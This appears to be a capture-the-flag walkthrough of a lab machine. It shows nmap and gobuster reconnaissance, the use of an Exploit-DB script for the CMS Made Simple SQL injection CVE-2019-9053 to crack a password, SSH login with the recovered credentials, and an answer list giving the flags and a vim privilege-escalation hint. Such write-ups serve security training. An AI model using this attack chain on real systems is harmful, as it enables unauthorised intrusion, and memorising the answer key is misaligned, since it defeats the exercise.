STEP 1: # started with nmap which is a network scanning tool used to discover hosts and services on a network.
root@ip-10-10-234-23:~# nmap -sVC 10.10.81.129
Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-28 15:49 BST
Nmap scan report for ip-10-10-81-129.eu-west-1.compute.internal (10.10.81.129)
Host is up (0.00051s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.234.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:55:8D:0A:70:71 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds

: '
I found that ports 21 (FTP), 80 (HTTP), and 2222 (SSH) are open. 
I also determined that there are 2 services running under port 1000 and 
identified SSH as the service running on the higher port.
'

STEP 2
: '
I then browsed the ip address and got an apache default page
'

# used gobuster
STEP 3: gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <ip>

gobuster dir -u http://10.10.81.129
Error: required flag(s) "wordlist" not set
root@ip-10-10-234-23:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.81.129
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.81.129
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/09/28 15:53:51 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2024/09/28 15:53:53 Finished
===============================================================

: '
Using a medium wordlist, gobuster found a webpage at /simple. 
I browsed to that page and saw it was a default page for “CMS Made Simple.” 
In the bottom corner, I noticed the version number: 2.2.8.
Next, I decided to search for this version online by looking for potential exploits.
I searched for “CMS Made Simple 2.2.8 exploit” on Google and found a relevant page on 
Exploit-DB that referred to a SQL injection vulnerability (CVE-2019–9053).
CVE I’m using against the application: CVE-2019–9053
Type of vulnerability: SQLi
'
# step 4
 : '
 Since the exploit was a Python script, I copied it into a .py file on my attack box.
To see the syntax, I ran the script without any arguments, which provided information on how to use it. 
The script required me to supply a URL with the -u flag and allowed me to specify a wordlist for password cracking using --crack -w.
 '

code: python exploit.py -u <target_url> --crack -w /path/to/wordlist.txt
python exploit.py -u http://10.10.81.129/simple --crack -w /path/to/wordlist.txt
# the passsword returned after executing the script was secret
# N/B: use pip install to be able to get the requests

: '
I used the credentials to SSH into the target machine.
ssh mitch@<target_ip>
Once inside, I listed the files using ls and then cat user.txt file, which contained my first flag.
User flag: G00d j0b, keep up!
'


: '
How many services are running under port 1000?
Answer: 2
What is running on the higher port?
Answer: ssh
Whats the CVE youre using against the application?
Answer: CVE-2019-9053
To what kind of vulnerability is the application vulnerable?
Answer: sqli
Whats the password?
Answer: secret
Where can you login with the details obtained?
Answer: ssh
Whats the user flag?
Answer: G00d j0b, keep up!
Is there any other user in the home directory? Whats its name?
Answer: sunbath
What can you leverage to spawn a privileged shell?
Answer: vim
Whats the root flag?
Answer: W3ll d0n3. You made it!
'

#step 5
: '
We are in the mitch home directory, so let’s go one directory up and list the folders.
ls
mitch, sunbath

'
